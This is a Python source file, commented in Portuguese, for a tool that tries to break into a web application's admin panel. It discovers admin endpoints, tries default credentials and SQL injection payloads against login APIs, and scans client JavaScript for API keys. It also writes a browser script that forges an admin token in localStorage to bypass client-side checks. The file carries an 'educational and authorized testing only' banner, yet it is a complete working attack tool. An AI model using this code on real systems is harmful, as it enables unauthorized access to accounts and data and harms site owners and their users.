"""
Exploração avançada para acesso administrativo
"""

import json
import re
import time
from typing import Any, Dict, List
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

from lib.wordlists import ADMIN_ENDPOINTS, DEFAULT_CREDENTIALS, SQLI_PAYLOADS


class AdminAccessExploit:
    """Exploração completa para tentar acessar painel admin."""

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
        self.findings: List[Dict[str, Any]] = []
        self.admin_urls: List[str] = []

    def log(self, message: str, level: str = "INFO") -> None:
        """Log formatado com cores."""
        colors = {
            'INFO': '\033[94m',
            'SUCCESS': '\033[92m',
            'WARNING': '\033[93m',
            'ERROR': '\033[91m',
            'EXPLOIT': '\033[95m'
        }
        reset = '\033[0m'
        timestamp = time.strftime('%H:%M:%S')
        print(f"{colors.get(level, '')}{timestamp} [{level}] {message}{reset}")

    def banner(self) -> None:
        """Banner do exploit."""
        banner_text = """
╔═══════════════════════════════════════════════════════════╗
║           EXPLOIT COMPLETO - ACESSO ADMIN                 ║
║                                                           ║
║  [!] APENAS PARA FINS EDUCACIONAIS E TESTES AUTORIZADOS  ║
╚═══════════════════════════════════════════════════════════╝
        """
        print(banner_text)

    def step_reconnaissance(self) -> None:
        """Reconhecimento e coleta de informações."""
        self.log("=== RECONHECIMENTO ===", "EXPLOIT")

        try:
            response = self.session.get(self.base_url, timeout=10)
            self.log(f"Status Code: {response.status_code}", "INFO")
            self.log(
                f"Server: {response.headers.get('Server', 'Unknown')}", "INFO")

            cors = response.headers.get(
                'Access-Control-Allow-Origin', 'Not Set')
            if cors == '*':
                self.log(f"CORS permissivo detectado: {cors}", "WARNING")
                self.findings.append({
                    'vuln': 'CORS Misconfiguration',
                    'exploitable': True,
                    'details': 'Permite requisições de qualquer origem'
                })

            soup = BeautifulSoup(response.text, 'html.parser')
            scripts = soup.find_all('script', src=True)
            self.log(f"Scripts externos encontrados: {len(scripts)}", "INFO")

        except Exception as e:
            self.log(f"Erro no reconhecimento: {str(e)}", "ERROR")

    def step_endpoint_discovery(self) -> None:
        """Descoberta de endpoints admin."""
        self.log("\n=== DESCOBERTA DE ENDPOINTS ADMIN ===", "EXPLOIT")
        self.log(
            f"Testando {len(ADMIN_ENDPOINTS)} possíveis endpoints...", "INFO")

        for path in ADMIN_ENDPOINTS:
            try:
                url = urljoin(self.base_url, path)
                response = self.session.get(
                    url, timeout=5, allow_redirects=False)

                if response.status_code == 200:
                    if 'admin' in response.text.lower() or 'dashboard' in response.text.lower():
                        self.log(
                            f"[✓] {path} - Status: {response.status_code}", "SUCCESS")
                        self.admin_urls.append(url)
                elif response.status_code in [301, 302]:
                    redirect = response.headers.get('Location', '')
                    self.log(
                        f"[→] {path} - Redireciona para: {redirect}", "WARNING")
                elif response.status_code in [401, 403]:
                    self.log(
                        f"[!] {path} - Status: {response.status_code} (Requer autenticação!)", "WARNING")
                    self.admin_urls.append(url)

            except Exception:
                pass

        if self.admin_urls:
            self.log(
                f"[+] {len(self.admin_urls)} endpoints admin encontrados!", "SUCCESS")
        else:
            self.log(
                "[!] Nenhum endpoint admin tradicional encontrado (SPA detectado)", "WARNING")
            self.admin_urls.append(urljoin(self.base_url, '/admin'))

    def step_bypass_authentication(self) -> None:
        """Tentativas de bypass de autenticação."""
        self.log("\n=== BYPASS DE AUTENTICAÇÃO ===", "EXPLOIT")

        auth_endpoints = [
            '/api/auth/login',
            '/api/login',
            '/api/auth/signin',
            '/api/v1/auth/login',
            '/auth/login',
            '/login',
        ]

        for endpoint in auth_endpoints:
            url = urljoin(self.base_url, endpoint)

            # Testa com credenciais padrão
            for creds in DEFAULT_CREDENTIALS[:3]:
                try:
                    response = self.session.post(url, json=creds, timeout=5)
                    if response.status_code != 404:
                        self.log(
                            f"[•] {endpoint} - {creds.get('username') or creds.get('email')} - Status: {response.status_code}",
                            "INFO"
                        )

                        if response.status_code == 200:
                            try:
                                data = response.json()
                                if any(key in data for key in ['token', 'access_token', 'success']):
                                    self.log(
                                        f"[!!! POTENCIAL SUCESSO !!!] Credenciais: {creds}", "SUCCESS")
                                    self.log(
                                        f"Resposta: {json.dumps(data, indent=2)}", "SUCCESS")
                            except:
                                pass
                except:
                    pass

            # Testa SQL Injection
            for payload in SQLI_PAYLOADS[:3]:
                try:
                    sqli_creds = {'username': payload, 'password': 'anything'}
                    response = self.session.post(
                        url, json=sqli_creds, timeout=5)

                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if any(key in data for key in ['token', 'success']):
                                self.log(
                                    "[!!! SQL INJECTION FUNCIONOU !!!]", "SUCCESS")
                                self.log(f"Payload: {payload}", "SUCCESS")
                        except:
                            pass
                except:
                    pass

    def step_client_side_analysis(self) -> None:
        """Análise do código client-side (React)."""
        self.log("\n=== ANÁLISE CLIENT-SIDE (SPA) ===", "EXPLOIT")
        self.log("Baixando e analisando código JavaScript...", "INFO")

        try:
            response = self.session.get(self.base_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            scripts = soup.find_all('script', src=True)

            self.log(f"[+] {len(scripts)} scripts encontrados", "INFO")

            for script in scripts[:5]:
                src = script.get('src')
                if not src.startswith('http'):
                    src = urljoin(self.base_url, src)

                try:
                    self.log(f"[•] Analisando: {src[:80]}...", "INFO")
                    js_response = self.session.get(src, timeout=10)
                    js_code = js_response.text

                    sensitive_patterns = {
                        'API Keys': r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                        'Admin Checks': r'isAdmin|isAdministrator|role\s*===?\s*["\']admin["\']',
                    }

                    for pattern_name, pattern in sensitive_patterns.items():
                        matches = re.findall(pattern, js_code, re.IGNORECASE)
                        if matches:
                            self.log(
                                f"  [!] {pattern_name} encontrado: {len(matches)} ocorrências", "WARNING")

                except Exception as e:
                    self.log(
                        f"  [!] Erro ao analisar script: {str(e)}", "ERROR")

        except Exception as e:
            self.log(f"Erro na análise client-side: {str(e)}", "ERROR")

    def generate_exploits(self) -> None:
        """Gera arquivos de exploit."""
        self.log("\n=== GERANDO EXPLOITS ===", "EXPLOIT")

        # Token manipulation exploit
        token_exploit = f"""
// EXPLOIT: Manipulação de tokens e acesso admin
console.log('%c[EXPLOIT] Iniciando manipulação de tokens...', 'color: red; font-weight: bold;');

const fakeAdminToken = btoa(JSON.stringify({{
    user: 'admin',
    role: 'administrator',
    permissions: ['read', 'write', 'delete', 'admin'],
    exp: Date.now() + 86400000,
    iat: Date.now()
}}));

localStorage.setItem('token', fakeAdminToken);
localStorage.setItem('user', JSON.stringify({{
    username: 'admin',
    role: 'admin',
    isAdmin: true,
    permissions: ['all']
}}));
localStorage.setItem('isAuthenticated', 'true');
localStorage.setItem('isAdmin', 'true');

console.log('[✓] Token de admin injetado!');
console.log('[→] Recarregando página...');

setTimeout(() => {{
    window.location.reload();
}}, 2000);
"""

        with open('token_exploit.js', 'w') as f:
            f.write(token_exploit)

        self.log(
            "[✓] Script de manipulação de tokens criado: token_exploit.js", "SUCCESS")

    def run_complete_exploit(self) -> None:
        """Executa exploração completa."""
        self.banner()

        try:
            self.step_reconnaissance()
            time.sleep(1)

            self.step_endpoint_discovery()
            time.sleep(1)

            self.step_bypass_authentication()
            time.sleep(1)

            self.step_client_side_analysis()
            time.sleep(1)

            self.generate_exploits()

            self.log("\n" + "="*60, "SUCCESS")
            self.log("EXPLORAÇÃO COMPLETA FINALIZADA!", "SUCCESS")
            self.log("="*60, "SUCCESS")

        except KeyboardInterrupt:
            self.log("\n[!] Exploração interrompida pelo usuário", "WARNING")
        except Exception as e:
            self.log(f"\n[!] Erro durante exploração: {str(e)}", "ERROR")
